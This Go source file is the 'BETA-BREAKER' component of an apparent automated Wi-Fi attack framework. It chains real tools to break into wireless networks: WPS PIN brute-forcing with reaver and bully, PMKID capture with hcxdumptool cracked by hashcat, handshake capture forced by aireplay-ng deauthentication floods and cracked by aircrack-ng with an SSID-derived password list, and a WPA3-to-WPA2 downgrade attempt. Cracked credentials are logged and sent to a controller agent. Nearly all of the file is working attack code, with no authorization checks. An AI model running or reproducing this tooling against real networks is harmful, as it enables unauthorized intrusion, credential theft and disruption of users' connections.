// BETA-BREAKER Agent
// WPS attack, PMKID capture, handshake capture, cracking, WPA3 downgrade

package etherbreach

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// BetaBreaker handles all cracking and downgrade attacks
type BetaBreaker struct {
	bus     *EventBus
	state   *SharedState
	stopCh  chan struct{}
	status  string
}

// NewBetaBreaker creates the breaker agent
func NewBetaBreaker() *BetaBreaker {
	return &BetaBreaker{
		stopCh: make(chan struct{}),
		status: "idle",
	}
}

func (b *BetaBreaker) Name() string   { return "BETA" }
func (b *BetaBreaker) Status() string { return b.status }

func (b *BetaBreaker) Start(bus *EventBus, state *SharedState) {
	b.bus = bus
	b.state = state
	ch := bus.Subscribe(b.Name())

	for {
		select {
		case msg := <-ch:
			b.handleMessage(msg)
		case <-b.stopCh:
			return
		}
	}
}

func (b *BetaBreaker) Stop() {
	close(b.stopCh)
}

func (b *BetaBreaker) handleMessage(msg AgentMessage) {
	switch msg.Type {
	case "ATTACK_WPS":
		if msg.Target != nil {
			b.status = "attacking_wps"
			b.attackWPS(msg.Target)
			b.status = "idle"
		}
	case "ATTACK_PMKID":
		if msg.Target != nil {
			b.status = "capturing_pmkid"
			b.capturePMKID(msg.Target)
			b.status = "idle"
		}
	case "ATTACK_HANDSHAKE":
		if msg.Target != nil {
			b.status = "capturing_handshake"
			b.captureHandshake(msg.Target)
			b.status = "idle"
		}
	case "CRACK_CAPTURE":
		b.status = "cracking"
		b.crackCapture(msg.Data)
		b.status = "idle"
	case "ATTACK_WPA3_DOWNGRADE":
		if msg.Target != nil {
			b.status = "wpa3_downgrade"
			b.wpa3Downgrade(msg.Target)
			b.status = "idle"
		}
	}
}

// attackWPS tries reaver or bully for WPS PIN
func (b *BetaBreaker) attackWPS(target *NetworkTarget) {
	b.broadcast(fmt.Sprintf("[WPS] Testing %s (%s)...", target.SSID, target.BSSID))
	iface := b.getMonitorIface()

	// Try reaver first
	if _, err := exec.LookPath("reaver"); err == nil {
		b.broadcast("[WPS] Using reaver...")
		cmd := exec.Command("sudo", "reaver",
			"-i", iface,
			"-b", target.BSSID,
			"-c", fmt.Sprintf("%d", target.Channel),
			"-vv",
			"-K", "1") // Pixie dust mode
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		// Run with timeout
		done := make(chan error, 1)
		go func() { done <- cmd.Run() }()

		select {
		case err := <-done:
			if err == nil {
				b.broadcast("\033[32m[WPS] Reaver completed! Check output for PIN/Password.\033[0m")
				b.recordSuccess(target, "WPS", "reaver_output")
			} else {
				b.broadcast(fmt.Sprintf("[WPS] Reaver failed: %v", err))
			}
		case <-time.After(300 * time.Second):
			cmd.Process.Kill()
			b.broadcast("[WPS] Reaver timeout (5 min). Trying bully...")
			b.tryBully(target)
		}
	} else {
		b.tryBully(target)
	}
}

func (b *BetaBreaker) tryBully(target *NetworkTarget) {
	if _, err := exec.LookPath("bully"); err != nil {
		b.broadcast("[!] bully not installed")
		return
	}
	iface := b.getMonitorIface()
	b.broadcast("[WPS] Using bully...")

	cmd := exec.Command("sudo", "bully",
		"-b", target.BSSID,
		"-c", fmt.Sprintf("%d", target.Channel),
		iface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
	b.broadcast("[WPS] Bully attempt complete.")
}

// capturePMKID uses hcxdumptool for fast PMKID capture
func (b *BetaBreaker) capturePMKID(target *NetworkTarget) {
	b.broadcast(fmt.Sprintf("[PMKID] Capturing for %s...", target.SSID))

	if _, err := exec.LookPath("hcxdumptool"); err != nil {
		b.broadcast("[!] hcxdumptool not installed. Falling back to handshake capture.")
		b.captureHandshake(target)
		return
	}

	iface := b.getMonitorIface()
	outFile := filepath.Join(b.state.HandshakesDir, fmt.Sprintf("%s.pcapng", strings.ReplaceAll(target.BSSID, ":", "")))

	cmd := exec.Command("sudo", "hcxdumptool",
		"-i", iface,
		"-o", outFile,
		"--enable_status=1",
		"--filtermode=2",
		"--filterlist_ap=", target.BSSID)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()

	select {
	case <-done:
		b.broadcast("[PMKID] Capture complete. Converting for hashcat...")
		b.convertPMKID(outFile, target)
	case <-time.After(60 * time.Second):
		cmd.Process.Kill()
		b.broadcast("[PMKID] Capture stopped after 60s. Converting...")
		b.convertPMKID(outFile, target)
	}
}

func (b *BetaBreaker) convertPMKID(pcapng string, target *NetworkTarget) {
	hashFile := filepath.Join(b.state.HandshakesDir, fmt.Sprintf("%s.22000", strings.ReplaceAll(target.BSSID, ":", "")))

	cmd := exec.Command("hcxpcapngtool", "-o", hashFile, pcapng)
	out, err := cmd.CombinedOutput()
	if err != nil {
		b.broadcast(fmt.Sprintf("[!] PMKID conversion failed: %v\n%s", err, string(out)))
		return
	}

	b.broadcast(fmt.Sprintf("[PMKID] Hash saved: %s", hashFile))

	// Try cracking with hashcat if available
	if _, err := exec.LookPath("hashcat"); err == nil {
		b.broadcast("[CRACK] Starting hashcat on PMKID...")
		wordlist := filepath.Join(b.state.WordlistsDir, fmt.Sprintf("%s.txt", target.SSID))
		b.ensureWordlist(target.SSID, wordlist)

		cmd := exec.Command("sudo", "hashcat", "-m", "22000", hashFile, wordlist)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	}
}

// captureHandshake does deauth + airodump for WPA handshake
func (b *BetaBreaker) captureHandshake(target *NetworkTarget) {
	b.broadcast(fmt.Sprintf("[HANDSHAKE] Capturing for %s on ch %d...", target.SSID, target.Channel))
	iface := b.getMonitorIface()
	prefix := filepath.Join(b.state.HandshakesDir, strings.ReplaceAll(target.BSSID, ":", ""))

	// Start airodump-ng in background
	dumpCmd := exec.Command("sudo", "airodump-ng",
		"-c", fmt.Sprintf("%d", target.Channel),
		"--bssid", target.BSSID,
		"-w", prefix,
		iface)
	dumpCmd.Stdout = os.Stdout
	dumpCmd.Stderr = os.Stderr
	if err := dumpCmd.Start(); err != nil {
		b.broadcast(fmt.Sprintf("[!] airodump-ng failed: %v", err))
		return
	}
	defer dumpCmd.Process.Kill()

	// Wait a moment for airodump to start
	time.Sleep(3 * time.Second)

	// Deauth all clients
	b.broadcast("[HANDSHAKE] Sending deauth packets...")
	for i := 0; i < 3; i++ {
		cmd := exec.Command("sudo", "aireplay-ng",
			"-0", "5",
			"-a", target.BSSID,
			iface)
		cmd.Run()
		time.Sleep(5 * time.Second)
	}

	// Check for handshake in cap file
	capFile := prefix + "-01.cap"
	time.Sleep(2 * time.Second)

	if _, err := os.Stat(capFile); err == nil {
		// Verify with aircrack-ng
		out, _ := exec.Command("aircrack-ng", capFile).CombinedOutput()
		if strings.Contains(string(out), "handshake") || strings.Contains(string(out), "WPA") {
			b.broadcast("\033[32m[HANDSHAKE] Capture successful!\033[0m")
			b.state.mu.Lock()
			b.state.Results.Handshakes++
			b.state.mu.Unlock()
			b.recordSuccess(target, "HANDSHAKE", capFile)

			// Auto-crack with AI wordlist
			wordlist := filepath.Join(b.state.WordlistsDir, fmt.Sprintf("%s.txt", target.SSID))
			b.ensureWordlist(target.SSID, wordlist)
			b.crackWithAircrack(capFile, wordlist, target)
		}
	}
}

// crackWithAircrack runs aircrack-ng with wordlist
func (b *BetaBreaker) crackWithAircrack(capFile, wordlist string, target *NetworkTarget) {
	b.broadcast(fmt.Sprintf("[CRACK] Running aircrack-ng with AI wordlist..."))
	cmd := exec.Command("sudo", "aircrack-ng",
		"-w", wordlist,
		"-b", target.BSSID,
		capFile)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

// ensureWordlist creates AI-generated wordlist for target
func (b *BetaBreaker) ensureWordlist(ssid, outputPath string) {
	// Build dynamic wordlist from SSID context
	b.broadcast(fmt.Sprintf("[WORDLIST] Generating context-aware wordlist for '%s'...", ssid))

	var words []string

	// Base: common passwords
	words = append(words, "password", "12345678", "qwertyui", "admin123", "letmein1")
	words = append(words, "123456789", "password1", "qwerty123", "welcome1", "abc12345")

	// Extract keywords from SSID
	lower := strings.ToLower(ssid)
	words = append(words, ssid, strings.ToUpper(ssid), ssid+"123", ssid+"2024", ssid+"2025", ssid+"2026")

	// Brand-specific keywords
	if strings.Contains(lower, "coffee") || strings.Contains(lower, "cafe") {
		words = append(words, "coffee", "cafe", "espresso", "latte", "mocha", "barista", "cappuccino")
		words = append(words, "coffee123", "cafe2024", "espresso1", "coffeeshop")
	}
	if strings.Contains(lower, "corp") || strings.Contains(lower, "office") {
		words = append(words, "corporate", "office2024", "company1", "business", "enterprise")
	}
	if strings.Contains(lower, "guest") || strings.Contains(lower, "visitor") {
		words = append(words, "guest123", "visitor1", "welcome", "guestwifi", "freepass")
	}
	if strings.Contains(lower, "home") || strings.Contains(lower, "house") {
		words = append(words, "home1234", "family1", "myhome", "homenet", "house2024")
	}

	// Common year variations
	for _, year := range []string{"2024", "2025", "2026", "2023", "2022", "2021", "2020"} {
		words = append(words, ssid+year, "password"+year, "admin"+year)
	}

	// Leet speak variations
	words = append(words, strings.ReplaceAll(ssid, "a", "4"), strings.ReplaceAll(ssid, "e", "3"))
	words = append(words, strings.ReplaceAll(ssid, "o", "0"), strings.ReplaceAll(ssid, "i", "1"))

	// Write to file
	f, err := os.Create(outputPath)
	if err != nil {
		return
	}
	defer f.Close()

	for _, w := range words {
		fmt.Fprintln(f, w)
	}

	b.broadcast(fmt.Sprintf("[WORDLIST] Generated %d passwords → %s", len(words), outputPath))
}

// crackCapture handles manual crack request
func (b *BetaBreaker) crackCapture(capFile string) {
	b.broadcast("[CRACK] Manual crack requested...")
	// This would parse the cap file and run crack
}

// wpa3Downgrade uses DragonShift or custom scapy to force WPA3 → WPA2 fallback
func (b *BetaBreaker) wpa3Downgrade(target *NetworkTarget) {
	if target.Security != "WPA3" {
		b.broadcast("[!] Target is not WPA3. No downgrade needed.")
		return
	}

	b.broadcast(fmt.Sprintf("[WPA3-DOWNGRADE] Attempting downgrade on %s...", target.SSID))

	// Check if DragonShift is available
	if _, err := exec.LookPath("dragonshift"); err == nil {
		cmd := exec.Command("sudo", "dragonshift",
			"-m", b.getMonitorIface(),
			"-t", target.BSSID)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
		return
	}

	// Fallback: use aireplay-ng with specific WPA3 SAE frames
	b.broadcast("[WPA3-DOWNGRADE] Using SAE auth flood fallback...")
	cmd := exec.Command("sudo", "aireplay-ng",
		"-0", "10",
		"-a", target.BSSID,
		b.getMonitorIface())
	cmd.Run()

	// After deauth, monitor for WPA2 association
	b.broadcast("[WPA3-DOWNGRADE] Monitoring for WPA2 fallback clients...")
}

// recordSuccess logs a found credential
func (b *BetaBreaker) recordSuccess(target *NetworkTarget, method, data string) {
	cred := Credential{
		Target:   target.SSID,
		Type:     method,
		Source:   data,
		Time:     time.Now(),
	}
	b.state.mu.Lock()
	b.state.Results.Cracked++
	b.state.Results.Passwords = append(b.state.Results.Passwords, cred)
	b.state.mu.Unlock()

	b.bus.Broadcast(AgentMessage{
		From:   b.Name(),
		To:     "OMEGA",
		Type:   "ATTACK_SUCCESS",
		Target: target,
		Data:   fmt.Sprintf("method=%s", method),
	})
}

func (b *BetaBreaker) getMonitorIface() string {
	b.state.mu.RLock()
	defer b.state.mu.RUnlock()
	return b.state.MonitorIface
}

func (b *BetaBreaker) broadcast(msg string) {
	b.bus.Broadcast(AgentMessage{
		From: b.Name(), To: "ALL", Type: "LOG", Data: msg,
	})
}
